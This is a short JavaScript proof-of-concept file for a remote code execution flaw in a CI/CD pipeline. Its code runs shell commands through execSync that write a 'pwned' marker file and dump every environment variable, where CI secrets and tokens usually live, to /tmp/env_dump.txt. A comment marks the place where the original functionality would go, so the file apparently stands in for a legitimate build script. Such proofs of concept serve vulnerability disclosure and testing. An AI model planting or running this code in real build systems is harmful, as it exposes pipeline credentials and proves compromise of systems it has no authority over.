// PoC - Demonstration of RCE vulnerability
// DO NOT USE IN PRODUCTION

import { execSync } from "child_process";

// Proof of arbitrary code execution
execSync('echo "[PoC] CI/CD environment compromised" > /tmp/pwned.txt');
execSync('env > /tmp/env_dump.txt');  // Demonstrate access to environment variables

// Original functionality would go here
console.log("[PoC] Malicious code execution successful");